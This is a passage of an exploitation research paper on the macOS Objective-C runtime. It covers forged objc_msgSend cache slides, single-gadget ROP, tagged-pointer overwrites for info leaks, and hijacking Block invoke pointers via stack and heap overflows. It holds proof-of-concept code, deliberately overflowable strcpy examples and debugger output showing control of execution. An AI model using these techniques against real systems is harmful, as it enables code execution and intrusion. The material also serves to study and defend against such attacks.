64-bit dangling objc_msgSend()\nThe 64-bit version of this technique is quite different to it's 32-bit\nbrethren. This is mostly due to the fact that 64-bit processes use a\nbrethren. This is mostly due to the fact that 64-bit processes use a\nwhole new version of the runtime.\nIn the new runtime, the objc_class structure is no longer a basic C\nstructure. Instead it uses C++ intrinsics to include methods.\nThe memory footprint for the new class is shown below.\nstruct objc_class : objc_object {\n\/\/ Class ISA;\nClass superclass;\ncache_t cache;             \/\/ formerly cache pointer and vtable\nclass_data_bits_t bits;    \/\/ class_rw_t * plus custom rr\/alloc flags\n...\n}\nThe cache_t struct looks as follows:\nstruct cache_t {\nstruct bucket_t *_buckets;\nmask_t _mask;\nmask_t _occupied;\n...\n}\nand a bucket_t struct looks like:\nstruct bucket_t {\nprivate:\ncache_key_t _key;\nIMP _imp;\n...\n}\nPutting this together. The main thing that has changed regarding the cache\nlookup, rather than an array of pointers to cache entries, there is simply\na single pointer to an array of SEL + method address entries at offset 0x10\ninto the structure. Following this, there's the mask, followed by an\noccupied field indicating that entries in the cache exist.\nThe critical difference in the run-time is the way the mask is used to\nindex into this table. Rather than the (SEL >> 2) value in the 32-bit\nruntime, the index is calculated via ((SEL & mask) << 4). This means, if we\nwere to abuse the mask in a similar way to the 32-bit technique we would\nneed a mask of 0xffff0000 in order to isolate the randomized bits.\nObviously even if we were able to make an allocation big enough to contain\nthe cache slide necessary for this it would be such a time consuming act to\npopulate 4gb worth of cache entries to catch the index that this is not\nreally a feasible process.\nInstead we must utilize an additional characteristic of the new runtime.\nThe objc_msgSend() call at a high level looks as follows:\nISA = *class_ptr;\noffset = ((SEL & ISA->mask) << 4);\nwhile(ISA->buckets[offset].SEL != 0) {\nif(ISA->buckets[offset].SEL == SEL) {\nreturn ISA->buckets[offset].method(args);\n} else {\noffset--;\ncontinue;\n}\n}\nThis means that if we once again create a large slide containing entries\nfor all possible randomized bits, we simply need to point (using the index\nwe control) the runtime to end of our slide, and let it walk backwards\nuntil it finds a match.\n----[ 64-bit Shared Region\nIn order to investigate this technique, we will begin again by looking at\nthe shared region on 64-bit processes. The shared region starts at the\naddress 0x7FFF80000000. Once again a cache file is mapped in, this time\nfrom \/var\/db\/dyld\/dyld_shared_cache_x86_64. This file is, once again,\nrandomized upon creation, however in 64-bit processes there is also a\nrandom slide added to the file when it is mapped in. This is calculated\nusing sizeof(shared_region) - sizeof(cache file) as the max. As far as our\ntechnique goes however this does not really change very much.\nCalculating the mask value for this technique can be challenging. There are\na few constraints which we must work against in order to index our bucket\nlist to the last entry.\nTo investigate this we will take a typical SEL value 0x00007fff99f88447\nThe bit pattern is broke down below.\nSEL:\n0x00       00       7f       ff       99       f8       84       47\n00000000 00000000 01111111 11111111 10011001 11111000 10000100 01000111\nUnfortunately the mask variable is only 4 bytes long. This means that the\npredictable bits in the upper 32-bits of the SEL are not available to us.\nAlso, the last 12 static bits (offset into page - 0x447) would result in an\nindex that is too small. If we used those bits we would not have a large\nenough offset to index to the end of the slide. Luckily, we have one single\nstatic bit in position 33 which we can count on being set. We can take\nadvantage of this bit with the following mask.\nMask:\n0x00       00       00       00       80       00       00       00\n00000000 00000000 00000000 00000000 10000000 00000000 00000000 00000000\nApplying this bit to any SEL value within the shared region will guarantee\nthe offset 0x80000000. Clearly this value is way beyond the end of our\nrequired slide, however since we also control the pointer to the bucket\nslide, we can subtract (0x80000000 - sizeof(cache)) from the pointer value\nto force it to point to the right location.\nThe example code main64.m demonstrates this technique. In this code, we use\na fakecache structure to control the initial cache lookup. A pad is used to\ncorrectly position the bucket pointer and mask.\nstruct fakecache {\nchar pad[0x10];\nlong bucketptr;\nlong mask;\n};\nNext, we allocate an array of cache entry structs in order to hold our SEL\nslide. Obviously in a real attack all these elements would be in a single\nallocation, however for this example we will split them up for clarity.\nstruct cacheentry {\nlong sel;\nlong rip;\n};\nstruct cacheentry *buckets = malloc((NUMBUCKETS+1) * sizeof(struct\ncacheentry));\nInitializing each of these elements is simply a case of incrementing the\nrandom value added to the SEL each time, and populating each entry.\nAgain, the RIP value is calculated by adding a relative offset to the SEL\nin order to locate our ROP gadget.\nfor(slide = 0; slide < NUMBUCKETS ; slide++) {\nbuckets[slide].sel = BASESEL + (slide * 0x1000);\nbuckets[slide].rip = buckets[slide].sel - 75654446;\n}\n----[ Uncommon 64-bit Libraries\nOnce again, libraries which are not within the shared region are mapped\ndirectly after the executable image in memory. Typically the text segment\naddress generated by the compiler is 0x100000000.\nThe same code is used to to generate the slide that we looked at earlier in\nthe 32-bit section. Here is an example of a slide for a 64-bit process with\nthe random() value of 0xdeadbeef.\nslide         = ((0xdeadbeef % (1<<16)) << 12)\nslide         = 0xbeef000\nexample SEL   = 0x10beef447\nAs you can see, in this example, there is no predictable bit in the lower\n32-bits of the SEL which we can rely on to index to the end of our table.\nOur only option here is to utilize the random bits in the SEL. We can do\nthis by repeating the entire spectrum of randomized values in our slide\nmultiple times. This way depending on the value of the random bits a\ndifferent offset will occur into the slide, however in most scenarios it\nwill result in finding one instance of the correct entry.\n--[ Single Gadget Exploitation Strategies\nNow that we've looked at how to get execution to a predictable location of\nour choice, the next step is to look at some ways to utilize this to our\nadvantage.\nObviously there is an abundance of ways that this can be utilized, but the\nfollowing 3 methods are ways that I have seen succeed in real life.\n----[ Return SEL Gadget\nAt the moment when we gain execution control using this technique a\nregister value contains the SEL pointer value. We can use this fact to our\nadvantage. For example, for 32-bit code, the following gadget could take\nadvantage of this.\n00000000  89C8              mov eax,ecx\n00000002  5E                pop esi\n00000003  5D                pop ebp\n00000004  C3                ret\nThe gadget above moves the SEL pointer value into the eax register,\nobviously on function return this register is treated as the return value.\nNext it restores EBP from the stack and uses the ret instruction to return\nfrom the function. This results in, rather than the expected return value\nfor whatever Objective-C method was dangling, the SEL value is returned.\nThis is only a useful approach if we are able to retrieve the value from\nthis context and utilize it to re-trigger the bug. In the example code\nprovided, the use of this gadget causes the SEL value to be printed, rather\nthan the length of the NSString which is intended. You can see the result\nof this below.\n-[nemo@objcbox:code]$ .\/leak\n[+] buckets is 0x10000000 size.\n[+] cacheentry is 0x30000000 size.\n[+] Setting up buckets\n[+] Done\n[+] Class @ 0x78622240\n[+] Overwriting object\n[+] Calling method\nString length: 0x93371b88\nLikewise, in some cases it may not make sense to return the SEL directly.\nIf it is not possible to retrieve the leaked value upon return it may make\nmore sense to execute a gadget which writes ecx somewhere in memory. For\nexample in a web browser context, writing the ecx register into a\nJavaScript array which is attacker controlled may result in the ability to\n\"collect\" this value from JavaScript context and re-trigger the bug.\n----[ Self Modifying ROP\nAnother potential use of the single gadget execution primitive is to use\nthe ecx register containing SEL to modify the rest of a ROP chain prior to\npivoting to use it.\nI have never personally been successful with this, however I have seen this\ndone in a friends exploit.\nFinding a gadget which accomplishes all this is extremely challenging.\n----[ Arbitrary Write Gadget\nThe final method for using a single gadget to continue the exploitation\nprocess is to turn the execution primitive into an arbitrary write\nprimitive.\nIt is usually fairly straight forward to find a gadget which allows you to\nwrite any high value to a fixed location. By positioning something at this\nlocation (eg 0x0d0d0d0d) this single write can be leveraged to escalate the\navailable functionality. For example, in a web context. Positioning a\nJavaScript array or string at this location then writing to the length\nfield can be enough to gain an arbitrary read\/write primitive from\nJavaScript. This is easily enough to finish the exploitation process.\nOutside of the browser context there are still a variety of length encoded\ndata types which can be used for this. Specifically to Objective-C, the\nNSMutableArray\/NSArray classes work this way.\n--[ Tagged Pointers\nOne of the new features added to the Objective-C runtime is the usage of\n\"tagged pointers\" to conserve resources. Tagged pointers take advantage of\nthe fact that the system memory allocator will align pointers handed out on\nnatural alignment boundaries. This means that the low bit will never be\nset.\n(lldb) print (long)malloc_good_size(1)\n(long) $0 = 16\nThe runtime takes advantage of this lower bit in order to indicate that the\npointer value is not to be treated as a regular pointer, and instead, bits\n61-63 are used as an index into a table of potential ISA pointers,\nregistered with the system. This means the first 60 bits can then by used\nto store the object payload itself inline.\nTagged pointer layout\n11111111 11111111 11111111 11111111 11111111 11111111 11111111 1111[111][1]\n|   |\n|  tag\nindex\nAs mentioned, index bits index into a table of potential object types. The\ndefault types registered with the runtime is shown below.\nOBJC_TAG_NSAtom            = 0,\nOBJC_TAG_1                 = 1,\nOBJC_TAG_NSString          = 2,\nOBJC_TAG_NSNumber          = 3,\nOBJC_TAG_NSIndexPath       = 4,\nOBJC_TAG_NSManagedObjectID = 5,\nOBJC_TAG_NSDate            = 6,\nOBJC_TAG_7                 = 7\nIt is possible for a developer to add their own types to the table, however\nit is very uncommon for anyone to do this. The guide at [3] clearly\nillustrates the mechanics of tagged pointers, if you require more\ninformation.\nNow that we've looked at how tagged pointers work, we will investigate some\nof them from an exploitation perspective.\n----[ Tagged NSAtom\nNSAtom is an extremely handy object type for exploitation. In order to use\na tagged NSAtom, we simply need the low bit set indicating a tagged\npointer, and then no bits set in the index bits. The value 0x1 by itself\nfor example will satisfy this. The beautiful thing about the NSAtom class\nis that calling any method name on this class will result in success.\nThe example code below simply calls the method initWithUTF8String on the\nobject 0x1. Clearly this is not a valid pointer, and instead is treated as\nan NSAtom. Any method name could be used and the result would still be 1.\nint main(int argc, const char * argv[])\n{\nprintf(\"[+] NSAtom returned: %u\\n\",[1 initWithUTF8String:\"lol\"]);\nreturn 0;\n}\n$ .\/nsatom\n[+] NSAtom returned: 1\nAs you can imagine, this behavior can be extremely useful for\nCoE or general exploitation. An example scenario would be, if you are\nforced to write through several Objective-C object pointers on the path to\nan overwrite target, any method call on those objects would require valid\npointers\/fake object setup. However with the NSAtom tagged pointer type,\nsimply replacing these pointers with the value 0x1 can be enough to stop\nthe crash and take advantage of the overwrite target.\nAlso, in extremely specific cases, the fact that this object returns true\ncan be used to manipulate the path of the program.\n----[ Tagged NSString\nThe next tagged pointer type we will investigate is the tagged NSString.\nWith the new runtime, when a NSString is created, the size of the string\nduring initialization dictates the type of storage for the string.\nString which are greater than 7 bytes in length are stored on the heap in a\ntypical Objective-C NSString object. However, for strings of 7-bytes or\nless, a tagged pointer with the index 2 is used. The bitpattern for a\ntagged NSString is shown below. It is comprised of 7 bytes of string data,\nfollowed by 4 bits for the length, 3-bit for the index into the tagged\npointer types array and finally the low bit to indicate tagged pointer\ntype.\n<-------------------[ String Data ]-------------------->\n11111111111111111111111111111111111111111111111111111111[1111][010][1]\n[strlen]<---->  |   |\n|  tag\nindex: 02\nThe first scenario in which we can abuse the properties of a tagged\nNSString is a partial overwrite into an untagged NSString. The example code\nincluded with this paper (nsstring1.m) demonstrates this.\nIn this code (shown below) we create an NSString (s) using the C string\ncontents \"thisisaverylongstringnottagged\". Since this is not 7 or less\nbytes in length this string is stored on the heap, and the object pointer\npoints to this.\nWe use the character pointer (ptr) to simulate a 1 byte write into the\nleast significant byte of the object pointer. This condition can occur from\neither a controlled overflow, or an actual 1 byte off-by-one.\nWe write the value 0xf5 to this byte, and then print the length and\ncontents of the string.\nint main(int argc, const char * argv[])\n{\nNSString *s = [[NSString alloc]\ninitWithUTF8String:\"thisisaverylongstringnottagged\"];\nchar *ptr = (char *)&s;\n*ptr = 0xf5; \/\/ NSString Tagged\nprintf(\"[+] NSString @ 0x%lx\\n\",(unsigned long)s);\nprintf(\"[+] String length: 0x%lx\\n\",(unsigned long)[s length]);\nNSLog(@\"%@\",s);\nreturn 0;\n}\nThe value 0xf5 in the least significant byte has the following bit pattern:\n[1111][010][1]\nAs you can see, this leaves us with a string length of 0xf, an index of 0x2\nand the LSB set to indicate a tagged pointer.\nBy only using a partial overwrite, we have left the first 7 bytes of the\npointer untouched.\nAs you can see from the output below, the length of the string is 0xf (15)\nafter this overwrite. This means that when the NSLog() attempts to print\nthe string contents, 15 bytes of data are pulled out starting from the\ninline data. This leaks the address of the object. If our target allows us\nto retrieve a string value and use it, we can turn a one byte overwrite\ninto an info leak primitive.\n$ .\/nsstring1\n[+] NSString @ 0x7fc0db4116f5\n[+] String length: 0xf\n2015-04-04 07:47:26.815 nsstring1[13335:92489992] eeeeeee 3eIjuaj\nThe next scenario which we will investigate involves overflowing into a\ntagged NSString, rather than an un-tagged variant. The example code\nnsstring2.m demonstrates this.\nIn this code, we initialize an NSString with the contents \"AAAAAAA\". Since\nthis is only 7 bytes of c-string it guarantees that the NSString will be a\ntagged type. This means it will contain the value:\n0x4141414141414175\nEssentially the first 7 bytes are taken up with our \"A\" contents. The last\nbyte contains the length (7) followed by the bitpattern to indicate\nNSString type of tagged pointer.\nNext, we once again simulate a single byte overflow into the object\npointer. This time we write the value 0x00, which is a common primitive in\nreal life due to off-by-one string operations. This forcefully unsets the\ntagged LSB in the pointer, turning the tagged string into an un-tagged\ntype.\nFinally we call the length method on the object.\nint main(int argc, const char * argv[])\n{\nNSString *s = [[NSString alloc] initWithUTF8String:\"AAAAAAA\"];\nchar *ptr = (char *)&s;\n*ptr = 0x00; \/\/ un-tag\nprintf(\"[+] NSString @ 0x%lx\\n\",(unsigned long)s);\nprintf(\"[+] String length: 0x%lx\\n\",(unsigned long)[s length]);\nNSLog(@\"%@\",s);\nreturn 0;\n}\nAs you can imagine, the runtime now treats our tagged object as untagged.\nThis means that the tagged pointer is now treated as a real pointer. If we\nwere able to control the contents of the NSString on initialization, this\nwould present us with direct control over the object cache lookup, allowing\nus to use the construct presented earlier in the paper to turn this into\ncode execution.\n(lldb) r\nProcess 13636 launched: '.\/nsstring2' (x86_64)\n[+] NSString @ 0x4141414141414100\nProcess 13636 stopped\n* thread #1: tid = 0x5834fc3, 0x00007fff96c210d7\nlibobjc.A.dylib`objc_msgSend + 23, queue = 'com.apple.main-thread', stop\nreason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)\nframe #0: 0x00007fff96c210d7 libobjc.A.dylib`objc_msgSend + 23\nlibobjc.A.dylib`objc_msgSend + 23:\n-> 0x7fff96c210d7:  andq   (%rdi), %r11\n0x7fff96c210da:  movq   %rsi, %r10\n0x7fff96c210dd:  andl   0x18(%r11), %r10d\n0x7fff96c210e1:  shlq   $0x4, %r10\n(lldb) reg read rdi\nrdi = 0x4141414141414100\n----[ Tagged NSNumber\nAs you can imagine, the NSNumber case is very similar to that of the\nNSString. Any number value which can be contained in the first 7 bytes of\nthe pointer is stores inline as a tagged NSNumber, rather than performing\nan allocation and storing the number on the heap.\nThe sample code nsnumber1.c demonstrates,once again, a single byte\noverwrite into a tagged pointer, containing an inline nsnumber.\nIn this code, we begin by instantiating an NSNumber containing the value\n0xdeadbeeffeedface. The contents of this number are unimportant, however\nclearly the number is large enough that it would not fit into the upper\nbytes of a tagged pointer, therefore this NSNumber is stored on the heap in\ntypical Objective-C fashion.\nNext, we write the value 0xf7 to the lower byte of the object pointer. Once\nagain this converts the un-tagged object pointer into a tagged type, while\nleaving the upper bits in-tact. Finally, we log the contents of the number\nusing the method unsignedLongLongValue.\nint main(int argc, const char * argv[])\n{\nNSNumber *n = [NSNumber numberWithInteger:0xdeadbeeffeedface];\nchar *ptr = (char *)&n;\n*ptr = 0xf7;\nNSLog(@\"0x%lx\\n\",(unsigned long)[n unsignedLongLongValue]);\nreturn 0;\n}\nAs you can see from the output below, rather than printing the initialized\ncontents (0xdeadbeeffeedface) the NSLog call displays the object pointer\nvalue itself, once again creating an information leak of this value.\n$ .\/nsnumber1\n2015-04-04 09:26:58.701 nsnumber1[14663:92514549] 0x7fd6134116\nThe final tagged pointer example nsnumber2.m demonstrates the counter case\nto this. In this code an NSNumber is instantiated containing the value\n0x0041414141414141. As you can see from the leading NULL byte, this value\nis small enough that it fits within the first 7 bytes of the object\npointer. Therefore, this object is created as a tagged pointer with the\nvalue:\n0x4141414141414107\nWe once again truncate the final byte using a character pointer, removing\nthe tagged bit before calling a method on it (unsignedLongLongValue).\nint main(int argc, const char * argv[])\n{\nNSNumber *n = [NSNumber numberWithInteger:0x0041414141414141];\nchar *ptr = (char *)&n;\n*ptr = 0x00;\nNSLog(@\"0x%lx\\n\",(unsigned long)[n unsignedLongLongValue]);\nreturn 0;\n}\nWhen the method call is made, the runtime treats the numbers contents as a\npointer, and leaves us with a dangling Objective-C message send call, which\nwe can once again abuse to control execution.\nProcess 14636 launched: '.\/nsnumber2' (x86_64)\nProcess 14636 stopped\n* thread #1: tid = 0x583a67f, 0x00007fff96c210d7\nlibobjc.A.dylib`objc_msgSend + 23, queue = 'com.apple.main-thread', stop\nreason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)\nframe #0: 0x00007fff96c210d7 libobjc.A.dylib`objc_msgSend + 23\nlibobjc.A.dylib`objc_msgSend + 23:\n-> 0x7fff96c210d7:  andq   (%rdi), %r11\n0x7fff96c210da:  movq   %rsi, %r10\n0x7fff96c210dd:  andl   0x18(%r11), %r10d\n0x7fff96c210e1:  shlq   $0x4, %r10\n(lldb) reg read rdi\nrdi = 0x4141414141414100\n----[ Additional Tagged Types\nThe additional types in the table have very unique properties. I will leave\nit as an exercise to the reader to investigate each of these types for\nuseful ways they can be used from an exploitation perspective.\n--[ Blocks\nSo, Apple being Apple, decided the tried and tested C standard wasn't good\nenough for their magical super fantastic operating system and went ahead\nand modified it. They did this by adding a new construct called Blocks.\nFor anyone familiar with the concept of an anonymous function reference in\nPerl, or a lambda function in Python, this is essentially what a Block is.\nYou can read about blocks in detail in Apple's guide [4]. TL;DR though, a\nblock basically uses the \"^\" operator to declare a special type of function\npointer where the body of the function can be defined inline. This is\nmostly a syntactic feature, but has a few runtime uses as well. They can be\npassed to other functions just like a function pointer, and can access\nglobal data, or data relative to the current executing state they are\ndefined in. Syntactically blocks are very similar to ecmascript Closures,\nhowever internally they function a little differently as you'll see.\n--[ Sample Block Code\nOk let's take a look at how Blocks are defined. Apple's guide [4] provides\nthe following little example code:\nint main(int ac, char **av)\n{\nint multiplier = 7;\nint (^myBlock)(int) = ^(int num) {\nreturn num * multiplier;\n};\nprintf(\"%d\\n\", myBlock(3));\n}\nAs you can see, this code defines a block called myBlock which takes an\ninteger argument \"num\" and multiplies it with a value \"multiplier\" taken\nfrom the stack of the main function where the block was declared.\nThe myBlock Block is then called passing the value 3. As expected when\nexecuted the block is entered and returns the multiplication of 7 * 3.\n-[dcbz@squee:~\/code\/blocks]$ gcc block.c -o block\n-[dcbz@squee:~\/code\/blocks]$ .\/block\n21\nNote, nothing fancy is needed to compile this, Apple's built in compiler\nsupports Blocks out of the box.\nAt first glance, i expected this feature to be syntactical only. I thought\nthe compiler would create a function, and then just add a single call\ninstruction in the appropriate places. Or maybe a function pointer if\nreassignment was required. However if we walk through the assembly listing\nfor this trivial program we can see that is not even close to the case.\nFirst we have the basic function prologue as expected...\nEntryPoint:\npush       rbp                           ; XREF=0x100000e2f\nmov        rbp, rsp\nsub        rsp, 0x50\nNext argv\/argc are moved into stack variables.\nmov        rax, rsi\nmov        ecx, edi\nmov        dword [ss:rbp-0x50+var_76], ecx\nmov        qword [ss:rbp-0x50+var_64], rax\nThe value 0x7 is stored in a stack variable to be referenced by the Block.\nThis it the \"multiplier\" variable.\nmov        dword [ss:rbp-0x50+var_12], 0x7\nOk now we come to the meat of the Block implementation. As you will see,\nthere's a little bit of code here, much more than expected. Before we\ncontinue tracing it we need to understand a little bit more about Block\ninternals.\nThe free chapter from the book Advanced Mac OS X Programming: The Big Nerd\nRanch Guide [5] has a really nice write up on the internals of Blocks which\nmakes this next bit really clear.\nBasically there are two structures defined for every Block created, the\nblock_descriptor and block_literal as well as the function containing the\nactual byte-code implementation of the Block.\nThe block literal structure is the most important structure for us to\nunderstand. Majority of the assembly listing we are tracing is used to\npopulate this structure appropriately. The definition for the structure is\nshown below:\nstruct block_literal_NAME {\nvoid *isa;\nint flags;\nint reserved;\nvoid (*invoke)(void *literal, ...);\nstruct block_descriptor_NAME *descriptor;\n\/* referenced captured variables follow *\/\n};\nBasically, the use of this structure is to turn our Block into a pseudo\nobjective-c object. As you can see the typical 'isa' pointer at offset 0\ncontains a pointer to the base class struct for the object.\nIn the listing below, we can see that the block_literal struct is being\ncreated at offset rbp-0x50+var_16. The ISA pointer is populated with a\npointer to the class \"NSConcreteStackBlock\".\nlea        rax, qword [ss:rbp-0x50+var_16]\nmov        rcx, qword [ds:imp___got___NSConcreteStackBlock]\nlea        rcx, qword [ds:rcx]\nmov        qword [ss:rbp-0x50+var_16], rcx\nAs described in [5], this class indicates that the Block is to be stored on\nthe stack. Other possible alternative base classes are:\nNSConcreteGlobalBlock for global Blocks, NSConcreteMallocBlock for heap\nbased Blocks, NSConcreteAutoBlock for Blocks affected by garbage collection\nand NSConcreteFinalizingBlock for blocks which have a\n\"finalizer\"\/destructor which must be run apon garbage collection. Cross\nreferencing these class structs can give us a pretty good indication where\nBlocks are used in a binary, and also their location in memory at runtime.\nmov        dword [ss:rbp-0x50+var_24], 0x40000000\nThe next element populated is the flags. I won't go into this too much\nbecause the write-up at [5] covers it perfectly. The flags enum stores some\nmeta information about the Block including garbage collection settings and\nwhether or not the Block is global.\nNext the reserved field is set to 0.\nmov        dword [ss:rbp-0x50+var_28], 0x0\nThe main_block_invoke_1 function is the invoke() method for this Block. It\nbasically contains the compiled instructions for the block itself. As you\nwill see it is called later when the Block is executed.\nlea        rcx, qword [ds:___main_block_invoke_1]\nmov        qword [ss:rbp-0x50+var_32], rcx\nEarlier we discussed the fact that there are two structures for every\nBlock. The second of these, the block descriptor is pre-created at compile\ntime and stored in the __data section.\nlea        rcx, qword [ds:___block_descriptor_tmp_1.1]\nmov        qword [ss:rbp-0x50+var_40], rcx\nThe struct definition is as follows:\nstatic const struct block_descriptor_NAME {\nunsigned long reserved;\nunsigned long literal_size;\n\/* helper functions - present only if needed *\/\nvoid (*copy_helper)(void *dst, void *src);\nvoid (*dispose_helper)(void *src);\n};\nBasically the only field we care about most of the time is the\nliteral_size, which contains the total size of the block_literal. The other\nfunction pointers are only used in specific cases.\nThe rest of the block literal struct contains the arguments to invoke.\nA copy of the \"multiplier\" variable is copied into this struct.\nmov        ecx, dword [ss:rbp-0x50+var_12]\nmov        dword [ss:rbp-0x50+var_48], ecx\nNow that the literal struct is populated, the code has to invoke the Block\npassing in the arguments. This is done by retrieving the invoke function\npointer from the literal struct populated earlier.\nI probably should have used an optimization flag when i compiled this,\nbecause the next couple of instructions are a little silly. A pointer to\nthe block literal struct is moved into var_0, then moved back into rax...\nmov        qword [ss:rbp-0x50+var_0], rax\nmov        rax, qword [ss:rbp-0x50+var_0]\nNext the invoke function pointer is moved into rax by dereferencing this\npointer and adding 16 (0x10).\nmov        rax, qword [ds:rax+0x10]\nThe pointer to the block literal struct is then moved into rcx.\nmov        rcx, qword [ss:rbp-0x50+var_0]\nThe value being passed to the Block in the printf() call (3) is temporarily\nmoved to edx.\nmov        edx, 0x3                      ; arg to block\nThe block_literal struct pointer is moved to rdi, which is the first\nargument in the x86_64 function calling convention (rdi,rsi,rcx,rdx).\nmov        rdi, rcx\nThe function argument (3) is then moved to esi as the second argument.\nmov        esi, edx\nFinally the invoke() method is called. invoke(self,3) basically.\ncall       rax\nThe rest of the assembly listing is just a call to printf to display the\nresult, followed by the epilogue.\nmov        ecx, eax\nxor        dl, dl\nlea        rdi, qword [ds:0x100000f2c]   ; \"%d\\\\n\"\nmov        esi, ecx\nmov        al, dl\ncall       imp___stubs__printf\nmov        eax, dword [ss:rbp-0x50+var_60]\nadd        rsp, 0x50\npop        rbp\nret\nAs you can see, this process is fairly straight forward, so now that we\nunderstand it we can look at how to abuse it.\n--[ Exploitation\nIn order to demonstrate exploitation scenarios where these Blocks can be\nutilized i will start by modifying the example code to contain a trivial\nstack overflow.\nint main(int ac, char **av)\n{\nint multiplier = 7;\nint (^myBlock)(int) = ^(int num) {\nreturn num * multiplier;\n};\nchar buf[20];\nif(ac != 2) {\nprintf(\"error: need 2nd arg\\n\");\nexit(1);\n}\nstrcpy(buf,av[1]);\nprintf(\"%s: %d\\n\", buf, myBlock(3));\nexit(1);\n}\nAs you can see, prior to the final printf() a call which copies the first\nargument to the program into a small stack buffer, without bounds checking,\nis added. I also added an exit(1); call to demonstrate that this program\ncouldn't necessarily be exploited without utilizing the Block. This also\napplies to cases where stack cookies (-fstack-protection) are used.\nAs we saw in the previous example, the block_literal structure used will be\nstored on the stack. Also the myBlock pointer to this structure is stored\non the stack in this case.\nSo what happens when we overflow the buf array in this case? Let's run it\nand see.\n-[dcbz@squee:~\/code\/blocks]$ gcc blockof.c -o of\n-[dcbz@squee:~\/code\/blocks]$ .\/of\nerror: need 2nd arg\n-[dcbz@squee:~\/code\/blocks]$ .\/of hello\nhello: 21\n-[dcbz@squee:~\/code\/blocks]$ gdb .\/of\n(gdb) r `perl -e'print \"A\"x5000'`\nStarting program: \/Users\/dcbz\/code\/blocks\/of `perl -e'print \"A\"x5000'`\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: 13 at address: 0x0000000000000000\n0x0000000100000e4e in main ()\nAs you can see, running this program with a overly large argument overflows\nthe stack based buffer and we get an EXC_BAD_ACCESS exception. For some\nreason gdb claims that it happened at address 0x0. However if we do some\ninvestigation:\n(gdb) x\/i $pc\n0x100000e4e <main+158>: mov    rax,QWORD PTR [rax+0x10]\n(gdb) i r rax\nrax            0x4141414141414141        4702111234474983745\nWe can see that the program is crashing dereferencing the block_literal\nstruct pointer to retrieve the \"invoke\" pointer. (based on our previous\nunderstanding of the assembly listing.) This means we have overwritten the\npointer to the block_literal struct with a series of 'A's (0x41). Because\nthe pointer to the struct lies in front of the struct itself we are unable\nto modify the invoke pointer directly. Therefore we are left with a very\nsimilar construct to a C++ vptr dereference. We can exploit this in a very\nsimilar fashion.\nThe construct is essentially \"call [ptr+0x10]\", therefore we need to\ncontrol memory at a known address in order to place a pointer to our\nshellcode, then we can use the address of this pointer minus 16 when we\noverwrite the block_literal struct pointer. This will result in execution\nflow being redirected to our shellcode. Another solution would be to\nreplace the value of the invoke pointer with another block's invoke method\nor known function. Then utilize an argument mismatch in a favorable way.\nBoth of these things have been documented numerous times so i'm not going\nto go into any more detail on this here. Although i will say, in order to\ncontrol memory at a fixed location, a few techniques might be, to use the\nshared_region_map_file technique, or disable aslr\/nx with posix_spawn for\nlocal issues, or use ROP\/heapspray for remote issues.\nNow that we've looked at the stack overflow case, let's look at what\nhappens when the block_literal struct contents are on the heap.\nTo test this basically we can take the test stack overflow we looked at\nearlier, and this time move the destination of the strcpy() call to the\nheap.\nIn order to move the Block to the heap we have to utilize a function in the\nruntime architecture. Basically libSystem is linked to the block library:\n\/usr\/lib\/system\/libsystem_blocks.dylib. This library contains functions for\nmanipulating and displaying Block information. One of the exported\nfunctions, \"Block_copy\" is used to create a copy of the block on the heap\nand return a pointer to it. This is typically used by functions that need\nto return a Block, since returning a pointer to a Block on the functions\nstack would be fail when the stack unwinds. The heap Block is then\nfree()'ed via the Block_release function. To call these functions we need\nto include the header file \"Block.h\".\nThe Block_copy function checks what type of block is being passed to it. If\nthe Block was allocated on the heap or .bss it simply returns the Block\nrather than making a copy. Otherwise a copy is placed on the heap and a\npointer returned, as you can see in the example code below:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <Block.h>\nint main(int ac, char **av)\n{\nchar *buf = malloc(20);\nint multiplier = 7;\nint (^stackBlock)(int) = ^(int num) {\nreturn num * multiplier;\n};\nint (^myBlock)(int) = Block_copy(stackBlock);\nif(ac != 2) {\nprintf(\"error: need 2nd arg\\n\");\nexit(1);\n}\nstrcpy(buf,av[1]);\nprintf(\"%s: %d\\n\", buf, myBlock(3));\nexit(1);\n}\nNow that we have some sample code, let's compile and run it and see where\noverflowing it gets us.\n-[dcbz@squee:~\/code\/blocks]$ gcc bh.c -o bh\n-[dcbz@squee:~\/code\/blocks]$ gdb .\/bh\n(gdb) r hi\nStarting program: \/Users\/dcbz\/code\/blocks\/bh hi\nReading symbols for shared libraries +............................. done\nhi: 21\nAs expected running it with the string hi, prints the usual output, this\ntime executing via the heap allocated Block. However if we pass a string of\n500 'A's...\nProgram exited with code 01.\n(gdb) r `perl -e'print \"A\"x500'`\nStarting program: \/Users\/dcbz\/code\/blocks\/bh `perl -e'print \"A\"x500'`\nProgram received signal EXC_BAD_ACCESS, Could not access memory.\nReason: 13 at address: 0x0000000000000000\n0x0000000100000dc4 in main ()\n(gdb) x\/i $pc\n0x100000dc4 <main+276>: call   rax\n(gdb) i r rax\nrax            0x4141414141414141       4702111234474983745\nAs you can see we get a crash again, however this time rather than it\ndereferencing the block_literal pointer, we have overwritten the invoke()\nmethod pointer itself and have directly controlled eip.\nAs you can imagine both these cases are useful when trying to gain control\nof an overflow, especially in the case of stack or heap canaries, or an\nunreachable return.\n--[ Future Research -- Non Pointer ISA\nUnfortunately, due to the fact that i'm trying to coordinate this paper\nrelease with my Infiltrate 2015 talk i am probably not going to have time\nto fully research this area prior to publication.\nBasically in the Objective-C runtime on the arm64 the ISA pointer can\nfunction as a tagged pointer as well. Due to the nature of the address\nspace there are a significant number of unused bits in the pointer which\ncontain an interesting amount of meta-data. The write-up at [6] clearly\nexplains all this. I will leave the bit pattern below just in case you are\ninterested. I am particularly eager to investigate the has_cxx_dtor\nattribute, as well as the sidetable reference counting information.\n(LSB)\n1       bit     indexed\n0 is raw isa, 1 is non-pointer isa.\n1       bit     has_assoc\nObject has or once had an associated reference. Object with no\nassociated references can deallocate faster.\n1       bit     has_cxx_dtor\nObject has a C++ or ARC destructor. Objects with no destructor can\ndeallocate faster.\n30      bits    shiftcls\nClass pointer's non-zero bits.\n9       bits    magic\nEquals 0xd2. Used by the debugger to distinguish real objects from\nuninitialized junk.\n1       bit     weakly_referenced\nObject is or once was pointed to by an ARC weak variable. Objects\nnot weakly referenced can deallocate faster.\n1       bit     deallocating\nObject is currently deallocating.\n1       bit     has_sidetable_rc\nObject's retain count is too large to store inline.\n19      bits    extra_rc\nObject's retain count above 1. (For example, if extra_rc is 5 